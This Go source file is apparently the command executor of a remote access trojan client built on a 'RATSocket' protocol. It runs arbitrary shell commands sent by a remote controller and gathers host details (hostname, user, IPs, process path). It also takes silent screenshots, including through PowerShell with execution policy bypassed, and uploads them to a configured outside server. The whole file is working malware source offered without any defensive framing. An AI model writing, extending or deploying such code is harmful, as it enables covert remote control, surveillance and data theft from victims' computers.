package executor

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"mime/multipart"
	"net"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"reflect"
	"runtime"
	"sort"
	"strconv"
	"strings"
	"time"

	"client-go/config"
	"client-go/protocol"
)

type Session struct {
	Sock             *protocol.RATSocket
	ClientID         string
	HostName         string
	Cwd              string
	CurrentCommandID int
}

func NewSession(sock *protocol.RATSocket, clientID string) *Session {
	wd, err := os.Getwd()
	if err != nil {
		wd = "."
	}

	host, err := os.Hostname()
	if err != nil || strings.TrimSpace(host) == "" {
		host = clientID
	}

	return &Session{
		Sock:     sock,
		ClientID: strings.TrimSpace(clientID),
		HostName: host,
		Cwd:      wd,
	}
}

func (s *Session) Dispatch(commandID int, raw string) (int, string) {
	s.CurrentCommandID = commandID
	defer func() { s.CurrentCommandID = 0 }()

	raw = strings.TrimSpace(raw)
	if raw == "" {
		return 0, "empty command"
	}

	name, args := parseCommand(raw)
	if ok, status, result := s.tryBuiltin(name, args); ok {
		return status, result
	}

	return s.shell(raw)
}

func (s *Session) tryBuiltin(name string, args []string) (bool, int, string) {
	methodName := strings.Title(strings.ToLower(strings.TrimSpace(name)))
	method := reflect.ValueOf(s).MethodByName(methodName)
	if !method.IsValid() {
		return false, 0, ""
	}

	methodType := method.Type()
	if methodType.NumIn() != 1 || methodType.In(0).Kind() != reflect.Slice || methodType.NumOut() != 2 {
		return true, 0, fmt.Sprintf("invalid builtin method signature: %s", methodName)
	}

	results := method.Call([]reflect.Value{reflect.ValueOf(args)})
	status, _ := results[0].Interface().(int)
	result, _ := results[1].Interface().(string)
	return true, status, result
}

func parseCommand(raw string) (string, []string) {
	parts := strings.Fields(strings.TrimSpace(raw))
	if len(parts) == 0 {
		return "", nil
	}
	return strings.ToLower(parts[0]), parts[1:]
}

func (s *Session) shell(command string) (int, string) {
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/C", command)
	} else {
		cmd = exec.Command("sh", "-c", command)
	}
	if strings.TrimSpace(s.Cwd) != "" {
		cmd.Dir = s.Cwd
	}

	out, err := cmd.CombinedOutput()
	if err != nil {
		if len(out) > 0 {
			return 0, string(out)
		}
		return 0, err.Error()
	}
	return 1, string(out)
}

func (s *Session) Cd(args []string) (int, string) {
	if len(args) == 0 {
		return 0, "Usage: cd <path>"
	}

	target := strings.TrimSpace(strings.Join(args, " "))
	if target == "" {
		return 0, "Usage: cd <path>"
	}

	if target == "~" {
		home, err := os.UserHomeDir()
		if err == nil && home != "" {
			target = home
		}
	}

	if !filepath.IsAbs(target) {
		target = filepath.Join(s.Cwd, target)
	}
	target = filepath.Clean(target)

	info, err := os.Stat(target)
	if err != nil {
		return 0, fmt.Sprintf("Failed to change directory: %v", err)
	}
	if !info.IsDir() {
		return 0, fmt.Sprintf("Failed to change directory: not a directory: %s", target)
	}

	s.Cwd = target
	return 1, ""
}

func (s *Session) Pwd(args []string) (int, string) {
	return 1, s.Cwd
}

func (s *Session) Kill(args []string) (int, string) {
	_ = s.Sock.Close()
	os.Exit(0)
	return 1, ""
}

func (s *Session) Getinfo(args []string) (int, string) {
	host, _ := os.Hostname()
	ips := listIPv4Addrs()

	info := map[string]string{
		"pid":          strconv.Itoa(os.Getpid()),
		"hostname":     host,
		"os":           runtime.GOOS,
		"os_version":   runtime.Version(),
		"architecture": runtime.GOARCH,
		"cpu_count":    strconv.Itoa(runtime.NumCPU()),
		"cwd":          s.Cwd,
		"exec_path":    safeExecutablePath(),
		"ips":          strings.Join(ips, ", "),
	}

	if userName := currentUserName(); userName != "" {
		info["username"] = userName
	}

	return 1, formatDict(info)
}

func (s *Session) Screenshot(args []string) (int, string) {
	filePath, err := s.captureScreenshotToTemp()
	if err != nil {
		return 0, fmt.Sprintf("Screenshot failed: %v", err)
	}
	defer func() { _ = os.Remove(filePath) }()

	return s.uploadSingleFileToServerResult(filePath, "screenshot")
}

func (s *Session) captureScreenshotToTemp() (string, error) {
	filePath := filepath.Join(os.TempDir(), fmt.Sprintf("screenshot_%d.png", time.Now().Unix()))

	var cmd *exec.Cmd
	switch runtime.GOOS {
	case "darwin":
		cmd = exec.Command("screencapture", "-x", filePath)
	case "windows":
		ps := fmt.Sprintf(`Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $bounds=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $bmp=New-Object System.Drawing.Bitmap $bounds.Width,$bounds.Height; $g=[System.Drawing.Graphics]::FromImage($bmp); $g.CopyFromScreen($bounds.Location,[System.Drawing.Point]::Empty,$bounds.Size); $bmp.Save('%s',[System.Drawing.Imaging.ImageFormat]::Png); $g.Dispose(); $bmp.Dispose()`, strings.ReplaceAll(filePath, "'", "''"))
		cmd = exec.Command("powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", ps)
	default:
		if _, err := exec.LookPath("gnome-screenshot"); err == nil {
			cmd = exec.Command("gnome-screenshot", "-f", filePath)
		} else if _, err := exec.LookPath("scrot"); err == nil {
			cmd = exec.Command("scrot", filePath)
		} else if _, err := exec.LookPath("import"); err == nil {
			cmd = exec.Command("import", "-window", "root", filePath)
		} else {
			return "", fmt.Errorf("no screenshot tool found")
		}
	}

	if strings.TrimSpace(s.Cwd) != "" {
		cmd.Dir = s.Cwd
	}
	out, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("%v: %s", err, strings.TrimSpace(string(out)))
	}

	info, statErr := os.Stat(filePath)
	if statErr != nil {
		return "", statErr
	}
	if info.Size() <= 0 {
		return "", fmt.Errorf("empty screenshot file")
	}

	return filePath, nil
}

func (s *Session) uploadSingleFileToServerResult(filePath string, category string) (int, string) {
	fileSize := int64(0)
	if info, err := os.Stat(filePath); err == nil {
		fileSize = info.Size()
	}

	payload, err := s.uploadFileToServer(filePath, category)
	if err != nil {
		return 0, err.Error()
	}

	message := buildUploadSuccessMessage(payload, filePath)
	if message == "" {
		message = fmt.Sprintf("HTTP upload completed\nOriginal: %s\nSize: %d bytes", filepath.Base(filePath), fileSize)
	}
	return 1, message
}

func (s *Session) uploadFileToServer(filePath string, category string) (map[string]interface{}, error) {
	url := strings.TrimRight(config.UPLOAD_BASE_URL, "/") + "/api/files/upload"

	file, err := os.Open(filePath)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)

	_ = writer.WriteField("artifact_type", "files")
	_ = writer.WriteField("category", defaultString(category, "default"))
	_ = writer.WriteField("client_id", s.ClientID)
	_ = writer.WriteField("hostname", s.HostName)
	_ = writer.WriteField("source_type", "client_upload")
	_ = writer.WriteField("related_path", "")
	if s.CurrentCommandID > 0 {
		_ = writer.WriteField("source_command_id", strconv.Itoa(s.CurrentCommandID))
	}

	part, err := writer.CreateFormFile("file", filepath.Base(filePath))
	if err != nil {
		return nil, err
	}
	if _, err := io.Copy(part, file); err != nil {
		return nil, err
	}
	if err := writer.Close(); err != nil {
		return nil, err
	}

	req, err := http.NewRequest(http.MethodPost, url, body)
	if err != nil {
		return nil, err
	}
	req.Header.Set("Content-Type", writer.FormDataContentType())

	client := &http.Client{Timeout: 60 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	respBytes, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}
	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
		return nil, fmt.Errorf("upload failed: http %d: %s", resp.StatusCode, strings.TrimSpace(string(respBytes)))
	}

	var payload map[string]interface{}
	if err := json.Unmarshal(respBytes, &payload); err != nil {
		return map[string]interface{}{"message": strings.TrimSpace(string(respBytes))}, nil
	}
	return payload, nil
}

func buildUploadSuccessMessage(payload map[string]interface{}, filePath string) string {
	if payload == nil {
		return ""
	}
	message := asString(payload["message"])
	if message == "" {
		message = "HTTP upload completed"
	}

	data, _ := payload["data"].(map[string]interface{})
	if data == nil {
		return message
	}

	originalName := asString(data["original_name"])
	if originalName == "" {
		originalName = filepath.Base(filePath)
	}
	storedName := asString(data["stored_name"])
	artifactID := asString(data["artifact_id"])
	downloadURL := asString(data["download_url"])

	lines := []string{message, fmt.Sprintf("Original: %s", originalName)}
	if storedName != "" {
		lines = append(lines, fmt.Sprintf("Stored: %s", storedName))
	}
	if artifactID != "" {
		lines = append(lines, fmt.Sprintf("Artifact ID: %s", artifactID))
	}
	if downloadURL != "" {
		lines = append(lines, fmt.Sprintf("Download URL: %s", downloadURL))
	}
	return strings.Join(lines, "\n")
}

func asString(v interface{}) string {
	switch x := v.(type) {
	case string:
		return x
	case fmt.Stringer:
		return x.String()
	default:
		return ""
	}
}

func defaultString(value string, fallback string) string {
	value = strings.TrimSpace(value)
	if value == "" {
		return fallback
	}
	return value
}

func safeExecutablePath() string {
	path, err := os.Executable()
	if err != nil {
		return ""
	}
	return path
}

func currentUserName() string {
	if runtime.GOOS == "windows" {
		return os.Getenv("USERNAME")
	}
	return os.Getenv("USER")
}

func listIPv4Addrs() []string {
	result := make([]string, 0)
	seen := make(map[string]struct{})

	ifaces, err := net.Interfaces()
	if err != nil {
		return result
	}

	for _, iface := range ifaces {
		addrs, err := iface.Addrs()
		if err != nil {
			continue
		}
		for _, addr := range addrs {
			ipNet, ok := addr.(*net.IPNet)
			if !ok || ipNet.IP == nil || ipNet.IP.IsLoopback() {
				continue
			}
			ip := ipNet.IP.To4()
			if ip == nil {
				continue
			}
			key := ip.String()
			if _, exists := seen[key]; exists {
				continue
			}
			seen[key] = struct{}{}
			result = append(result, key)
		}
	}

	sort.Strings(result)
	return result
}

func formatDict(values map[string]string) string {
	if len(values) == 0 {
		return ""
	}
	keys := make([]string, 0, len(values))
	maxLen := 0
	for key := range values {
		keys = append(keys, key)
		if len(key) > maxLen {
			maxLen = len(key)
		}
	}
	sort.Strings(keys)

	lines := make([]string, 0, len(keys))
	for _, key := range keys {
		lines = append(lines, fmt.Sprintf("%-*s : %s", maxLen, key, values[key]))
	}
	return strings.Join(lines, "\n")
}
